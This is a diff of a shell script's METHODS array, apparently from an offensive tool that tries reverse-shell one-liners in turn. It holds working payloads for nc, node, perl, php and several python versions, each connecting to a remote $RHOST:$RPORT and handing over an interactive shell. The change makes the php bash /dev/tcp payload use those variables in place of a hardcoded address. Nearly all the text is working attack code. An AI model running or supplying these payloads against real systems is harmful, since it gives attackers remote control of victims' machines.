@@ -112,7 +112,7 @@ METHODS=(
 	"nc , $(nc -w 1 -lnvp 5253 &> /dev/null & nc 0.0.0.0 5253 &> /dev/null) , nc $RHOST $RPORT -e $SHELL:"
 	#"node , node -e 'process.exit(0)' , node -e 'sh = require(\"child_process\").spawn(\"$SHELL\");net.connect(process.env.RPORT, process.env.RHOST, function () {this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});':"
 	#"perl , perl -e \"use Socket;\" , perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($RPORT,inet_aton($RHOST){open(STDIN,\"\>\&S\");open(STDOUT,\"\>\&S\");open(STDERR,\"\>\&S\");exec(\"$SHELL -i\");};':"
-	"php , php -r 'exit();' , php -r \\\"exec(\\\\\\\"/bin/bash -c 'bash -i >& /dev/tcp/0.0.0.0/5253 0>&1'\\\\\\\");\\\":"
+	"php , php -r 'exit();' , php -r \\\"exec(\\\\\\\"/bin/bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\\\\\\\");\\\":"
 	"python , python -c 'import socket,subprocess,os;exit()' , python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);':"
 	"python2 , python2 -c 'import socket,subprocess,os;exit()' , python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);':"
 	"python2.7 , python2.7 -c 'import socket,subprocess,os;exit()' , python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);':"
